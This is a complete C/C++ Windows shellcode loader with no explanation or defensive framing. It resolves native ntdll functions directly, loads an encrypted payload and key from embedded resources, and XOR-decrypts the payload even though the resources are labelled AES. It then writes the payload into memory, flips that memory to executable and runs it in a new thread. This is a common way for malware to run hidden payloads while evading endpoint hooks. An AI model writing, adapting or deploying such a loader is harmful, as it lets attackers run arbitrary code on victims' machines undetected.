#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "user32.lib")

typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect);

typedef NTSTATUS(NTAPI* NtWriteVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    SIZE_T* NumberOfBytesWritten);

typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect);

typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    LPVOID ObjectAttributes,
    HANDLE ProcessHandle,
    LPTHREAD_START_ROUTINE StartRoutine,
    LPVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    LPVOID AttributeList);

void LoadResourceData(const char* resName, char** data, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResource(hModule, resName, RT_RCDATA);
    if (!hResource) {
        printf("Resource %s not found!\n", resName);
        exit(1);
    }

    HGLOBAL hResData = LoadResource(hModule, hResource);
    *size = SizeofResource(hModule, hResource);
    *data = (char*)LockResource(hResData);
}

void DecryptXOR(char* shellcode, DWORD shellcodeLen, unsigned char* key, DWORD keyLen) {
    for (DWORD i = 0; i < shellcodeLen; i++) {
        shellcode[i] ^= key[i % keyLen]; // XOR with the key in a repeating fashion
    }
}

int main() {
    // Load ntdll.dll and get function addresses
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    if (!hNtdll) {
        printf("Failed to load ntdll.dll\n");
        return -1;
    }

    auto NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    auto NtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    auto NtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    auto NtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(hNtdll, "NtCreateThreadEx");

    if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory || !NtProtectVirtualMemory || !NtCreateThreadEx) {
        printf("Failed to get function addresses from ntdll.dll\n");
        return -1;
    }

    // Load the AES key and code (resources)
    char* AESkey;
    DWORD AESkeyLen;
    LoadResourceData("AESKEY", &AESkey, &AESkeyLen);
    printf("Resource AESKEY loaded with size %d\n", AESkeyLen);

    char* AESCode;
    DWORD AESCodeLen;
    LoadResourceData("AESCODE", &AESCode, &AESCodeLen);
    printf("Resource AESCODE loaded with size %d\n", AESCodeLen);

    // Allocate memory for the shellcode
    PVOID allocmem = nullptr;
    SIZE_T sizeaescode = AESCodeLen;
    NTSTATUS status = NtAllocateVirtualMemory(GetCurrentProcess(), &allocmem, 0, &sizeaescode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0) {
        printf("Failed to allocate memory, error code: %ld\n", status);
        return -1;
    }
    DecryptXOR(AESCode, AESCodeLen, AESkey , AESkeyLen);

    // Write shellcode to allocated memory
    SIZE_T bytesWritten = 0;
    status = NtWriteVirtualMemory(GetCurrentProcess(), allocmem, AESCode, AESCodeLen, &bytesWritten);
    if (status != 0) {
        printf("Failed to write memory, error code: %ld\n", status);
        return -1;
    }

    // Change memory protection to execute
    ULONG oldProtect = 0;
    status = NtProtectVirtualMemory(GetCurrentProcess(), &allocmem, &sizeaescode, PAGE_EXECUTE_READ, &oldProtect);
    if (status != 0) {
        printf("Failed to change memory protection, error code: %ld\n", status);
        return -1;
    }

    // Create a thread to execute the shellcode
    HANDLE threadHandle;
    status = NtCreateThreadEx(&threadHandle, GENERIC_ALL, nullptr, GetCurrentProcess(),
                              (LPTHREAD_START_ROUTINE)allocmem, nullptr, 0, 0, 0, 0, nullptr);
    if (status != 0) {
        printf("Failed to create thread, error code: %ld\n", status);
        return -1;
    }
    
    DWORD threadId = GetThreadId(threadHandle);
    printf("Thread created with ID: %d\n", threadId);

// Optionally wait for the thread to complete
    WaitForSingleObject(threadHandle, INFINITE);

    printf("Shellcode executed successfully!\n");

    return 0;
}
